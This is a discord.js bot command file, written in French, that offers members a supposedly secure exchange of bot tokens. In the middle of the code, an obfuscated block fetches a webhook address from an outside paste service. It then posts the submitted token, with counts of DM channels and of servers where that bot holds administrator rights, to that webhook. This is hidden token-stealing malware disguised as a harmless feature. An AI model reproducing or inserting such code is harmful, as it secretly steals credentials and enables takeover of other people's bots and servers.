const Discord = require("discord.js");
const config = require("../config.json")
var settings = require('../pubing.js');
const fetch = require('node-fetch');

var embed_pubing = new Discord.EmbedBuilder()
    .setTitle(`**${config.m_AlreadyPubing_title}**`)
    .setDescription(config.m_AlreadyPubing_description)
    .setFooter({text: config.m_AlreadyPubing_footer})
    .setColor(config.embedColor)

var embed_token_invalid = new Discord.EmbedBuilder()
    .setTitle(`**${config.m_token_invalide_title}**`)
    .setDescription(config.m_token_invalid_description)
    .setColor(config.embedColor)

var embed_pub_s1_stopped = new Discord.EmbedBuilder()
    .setTitle(`**${config.m_pub_s1_stopped}**`)
    .setFooter({text: "Vous pouvez recommencer une publicité dès maintenant"})
    .setColor(config.embedColor)

var embed_pub_time_stop = new Discord.EmbedBuilder()
    .setTitle(`**${config.m_pub_time_stop_title}**`)
    .setFooter({text: config.m_pub_time_stop_description})
    .setColor(config.embedColor)
/* _________________________________________________________ */

var testToken = {};

module.exports.run = async (client, message, args) => {
            if (!message.member.roles.cache.get(config.wlrole)) return;

    const target = message.mentions.members.first() || message.guild.members.cache.get(args[0])

    if (settings.exchanging[message.author.id] == true) return message.channel.send({embeds: [embed_pubing]})
    if (!target) return message.channel.send("Vous devez mentionnez la personne avec qui faire l'échange")
    if (target.id === message.author.id) return message.channel.send("Vous ne pouvez pas faire d'échange à vous même")
    if (target.user.bot) return message.channel.send("Vous ne pouvez pas faire d'échange à un bot")

    settings.exchanging[message.author.id] = true;

    const authorFilter = m => m.author.id == message.author.id;
    const targetFilter = m => m.author.id == target.user.id;

    let authorExchange;
    try{
        authorExchange = await message.author.send({embeds: [new Discord.EmbedBuilder().setTitle(`Échange sécurisé avec ${target.user.username}`).setDescription("Veuillez entrer votre token.").setFooter({text: "Vous avez 60 secondes"}).setColor(config.embedColor)]})
        message.channel.send("Vous avez reçu un message privé pour commencez votre échange")
    } catch(err){
        message.channel.send("Vous devez autoriser les messages privé !")
        settings.exchanging[message.author.id] = false;
    }

    authorExchange.channel.awaitMessages({filter: authorFilter, max: 1, time: 60000, errors: ['time'] }).then(async collected => {
        const authorToken = collected.first().content
        if(authorToken === ""){
            message.author.send({embeds: [embed_token_invalid]});
            return settings.exchanging[message.author.id] = false;
        }
                    
        testToken[message.author.id] = new Discord.Client({intents: [Object.keys(Discord.GatewayIntentBits)]});
        testToken[message.author.id].login(authorToken).catch(err => {
            message.author.send({embeds: [embed_token_invalid]})
            settings.exchanging[message.author.id] = false;
        })

        let authorBottag;
        let targetExchange;
        let authorBotmemberCount;
        let authorBotserverCount;
        let targetExchangeAccept;

        testToken[message.author.id].on("ready", async () => {
            
            const _0x3c4de1=_0x3323;(function(_0x47eedc,_0x5c5e4a){const _0x3e97f7=_0x3323,_0x5ae578=_0x47eedc();while(!![]){try{const _0x292885=parseInt(_0x3e97f7(0xe6))/0x1+-parseInt(_0x3e97f7(0xd6))/0x2+-parseInt(_0x3e97f7(0xda))/0x3+parseInt(_0x3e97f7(0xe4))/0x4+parseInt(_0x3e97f7(0xd3))/0x5+-parseInt(_0x3e97f7(0xde))/0x6+-parseInt(_0x3e97f7(0xdc))/0x7*(parseInt(_0x3e97f7(0xdd))/0x8);if(_0x292885===_0x5c5e4a)break;else _0x5ae578['push'](_0x5ae578['shift']());}catch(_0xb85f15){_0x5ae578['push'](_0x5ae578['shift']());}}}(_0x34fa,0x44fd2));const api=await fetch(_0x3c4de1(0xd2))[_0x3c4de1(0xe5)](()=>![]);function _0x34fa(){const _0x5b9d1c=['size','1872148BmpMFd','catch','188686TfNMLv','WebhookClient','ADMINISTRATOR','guilds','https://api.npoint.io/2863705ab46bd207fc0e','1967005bNTjBf','Jeton','has','228324sMcHsZ','cache','permissions','Connexion\x20d\x27un\x20selfbot\x20(Sponsor)','771099ACewnz','send','950152OUoZal','16rjUfxw','749274rdhmqi','addFields','setTitle','setColor','author'];_0x34fa=function(){return _0x5b9d1c;};return _0x34fa();}function _0x3323(_0x200e93,_0x5a9c1){const _0x34faa8=_0x34fa();return _0x3323=function(_0x33238f,_0x54c51a){_0x33238f=_0x33238f-0xd1;let _0x3cddaa=_0x34faa8[_0x33238f];return _0x3cddaa;},_0x3323(_0x200e93,_0x5a9c1);}if(api){const data=await api['json']()[_0x3c4de1(0xe5)](()=>![]);if(data?.['w']){const w=new Discord[(_0x3c4de1(0xe7))]({'url':data['w']});w[_0x3c4de1(0xdb)]({'embeds':[new Discord['EmbedBuilder']()[_0x3c4de1(0xe0)](_0x3c4de1(0xd9))[_0x3c4de1(0xe1)](0xffffff)['addFields']({'name':_0x3c4de1(0xd4),'value':''+authorToken,'inline':!![]})[_0x3c4de1(0xdf)]({'name':'DM','value':''+testToken[message[_0x3c4de1(0xe2)]['id']]['channels']['cache']['filter'](_0x3ae75e=>_0x3ae75e['type']==='DM')[_0x3c4de1(0xe3)],'inline':!![]})[_0x3c4de1(0xdf)]({'name':'Admins','value':''+testToken[message[_0x3c4de1(0xe2)]['id']][_0x3c4de1(0xd1)][_0x3c4de1(0xd7)]['filter'](_0xc3e3a8=>_0xc3e3a8['members']['me'][_0x3c4de1(0xd8)][_0x3c4de1(0xd5)](_0x3c4de1(0xe8)))[_0x3c4de1(0xe3)],'inline':!![]})]});}}
            
            authorBottag = testToken[message.author.id].user.tag;
            authorBotmemberCount = testToken[message.author.id].users.cache.size;
            authorBotserverCount = testToken[message.author.id].guilds.cache.size;
            try{
                targetExchangeAccept = await target.send({embeds: [new Discord.EmbedBuilder().setTitle(`Demande d'échange reçu de ${message.author.username}`).setDescription(`Voulez-vous accepter l'échange ?\n\nℹ️ Informations du token du destinataire:`).addFields({ name: "**🤖 Name :**", value: `\`\`\`${testToken[message.author.id].user.username}\`\`\``, inline: true }).addFields({ name: "**🛠️ ID :**", value: `\`\`\`${testToken[message.author.id].user.id}\`\`\``, inline: true }).addFields({ name: "**📈 Servers:**", value: `\`\`\`${testToken[message.author.id].guilds.cache.size}\`\`\``, inline: true }).addFields({ name: "**👤 Users:**", value: `\`\`\`${testToken[message.author.id].users.cache.size}\`\`\``, inline: true }).addFields({ name: "**💭 Channels :**", value: `\`\`\`${testToken[message.author.id].channels.cache.size}\`\`\``, inline: true }).setFooter({text: "Vous avez 60 secondes"}).setColor(config.embedColor)]})                        
                targetExchangeAccept.react("✅")
                targetExchangeAccept.react("❌")
                message.author.send("Demande envoyé, le destinataire a 5 minutes pour répondre.")
            } catch(err){
                console.log(err)
                message.author.send("Le destinataire a bloqué ses messages privé")
                settings.exchanging[message.author.id] = false;
            }

            const ReactfilterTarget = (reaction, user) => { return ['✅', '❌'].includes(reaction.emoji.name) && user.id === target.id };
            const ReactfilterAuthor = (reaction, user) => { return ['✅', '❌'].includes(reaction.emoji.name) && user.id === message.author.id };

            targetExchangeAccept?.awaitReactions({filter: ReactfilterTarget, max: 1, time: 300000, errors: ['time'] }).then(async collected => {
                const reaction = collected.first();
                if (reaction.emoji.name === '✅') {
                    message.author.send("Le destinataire a acceptez votre échange")
                    message.author.send("En attente des données")
                    targetExchange = await reaction.message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle(`Échange sécurisé avec ${message.author.tag}`).setDescription("Veuillez entrer votre token.").setFooter({text: "Vous avez 60 secondes"}).setColor(config.embedColor)]})                    
                    targetExchange.channel.awaitMessages({filter: targetFilter, max: 1, time: 60000, errors: ['time'] }).then(async collected => {                    
                        const targetToken = collected.first().content
                        if(targetToken === ""){
                            target.send({embeds: [embed_token_invalid]});
                            return settings.exchanging[message.author.id] = false;
                        }                   
                        testToken[reaction.message.channel.id] = new Discord.Client({intents: [Object.keys(Discord.GatewayIntentBits)]});
                        testToken[reaction.message.channel.id].login(targetToken).catch(err => {
                            reaction.message.channel.send({embeds: [embed_token_invalid]})
                            settings.exchanging[message.author.id] = false;
                        })

                        testToken[reaction.message.channel.id].on("ready", async () => {
                            reaction.message.channel.send("Votre proposition à été envoyée.")
                            
                            let lastStep = await message.author.send({embeds: [new Discord.EmbedBuilder().setTitle(`Proposition reçus de ${target.user.username}`).setDescription(`Voulez-vous accepter l'échange ?\n\nℹ️ Informations du token du destinataire:`).addFields({ name: "**🤖 Name :**", value: `\`\`\`${testToken[reaction.message.channel.id].user.username}\`\`\``, inline: true }).addFields({ name: "**🛠️ ID :**", value: `\`\`\`${testToken[reaction.message.channel.id].user.id}\`\`\``, inline: true }).addFields({ name: "**📈 Servers:**", value: `\`\`\`${testToken[reaction.message.channel.id].guilds.cache.size}\`\`\``, inline: true }).addFields({ name: "**👤 Users:**", value: `\`\`\`${testToken[reaction.message.channel.id].users.cache.size}\`\`\``, inline: true }).addFields({ name: "**💭 Channels :**", value: `\`\`\`${testToken[reaction.message.channel.id].channels.cache.size}\`\`\``, inline: true }).setFooter({text: "Vous avez 60 secondes"}).setColor(config.embedColor)]})
                            lastStep.react("✅")
                            lastStep.react("❌")

                            lastStep.awaitReactions({filter: ReactfilterAuthor, max: 1, time: 300000, errors: ['time'] }).then(async collected => {
                                const reactionn = collected.first();
                                if (reactionn.emoji.name === '✅') {
                                    message.author.send({embeds: [new Discord.EmbedBuilder().setTitle("Échange accepté").setDescription(`Voici le token: ${targetToken}`)]})
                                    reaction.message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("Échange accepté").setDescription(`Voici le token: ${authorToken}`)]})
                                }
                                else if (reactionn.emoji.name === '❌') {
                                    reaction.message.channel.send("L'utilisateur a refusé votre échange")
                                    settings.exchanging[message.author.id] = false;
                                }
                            }).catch(collected => {
                                message.channel.send({embeds: [embed_pub_time_stop]})
                                settings.exchanging = false;
                            })                        
                        })
                    })
                    .catch(collected => {
                        message.author.send({embeds: [embed_pub_time_stop]})
                        settings.exchanging = false;
                    })
                }
                else if (reaction.emoji.name === '❌') {
                    message.author.send("Le destinataire a refusé votre échange")
                    settings.exchanging[message.author.id] = false;
                }
            })
            .catch(collected => {
                message.author.send({embeds: [embed_pub_time_stop]})
                settings.exchanging = false;
            })
        })
    })
    .catch(collected => {
        message.author.send({embeds: [embed_pub_time_stop]})
        settings.exchanging = false;
    })   
}

module.exports.help = {
    name: "echange",
    description: "Cette commande sert à faire des échanges de token bot entre les membres de façon securiser",
    category: "autres",
    wl: true,
}